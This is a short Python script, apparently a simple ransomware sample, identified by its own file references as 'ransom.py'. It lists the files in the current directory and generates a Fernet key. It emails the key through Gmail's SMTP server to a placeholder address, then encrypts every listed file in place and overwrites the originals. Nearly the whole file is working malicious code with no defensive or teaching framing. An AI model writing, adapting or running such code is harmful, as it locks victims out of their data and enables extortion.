import os
from cryptography.fernet import Fernet
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Create file list
file_list = []
for file in os.listdir():
    if file == "ransom.py" or file == "generatedkey.key" or file == "ransomdecrypter.py":
        continue
    if os.path.isfile(file):
        file_list.append(file)

print(file_list)

# Create the key
key = Fernet.generate_key()

# Save key to file
with open("generatedkey.key", "wb") as generatedkey:
    generatedkey.write(key)

# Send key by email
def send_key_via_email(key):
    # Email configurations
    sender_email = "your_email@gmail.com"  # Sender email address
    receiver_email = "your_email@gmail.com"  # Recipient email address
    password = "your_password"  # Password of the sending email address

    # Create email content
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = "Encryption Key"

    # Message content
    body = f"Your encryption key is: {key.decode()}"
    message.attach(MIMEText(body, "plain"))

    # Connect to SMTP server and send email
    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()  # Start secure connection
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
        print("Key has been sent via email.")
    except Exception as e:
        print("Error sending email:", e)

# Send key by email
send_key_via_email(key)

# Encrypt files
for file in file_list:
    with open(file, "rb") as the_file:
        contents = the_file.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as the_file:
        the_file.write(contents_encrypted)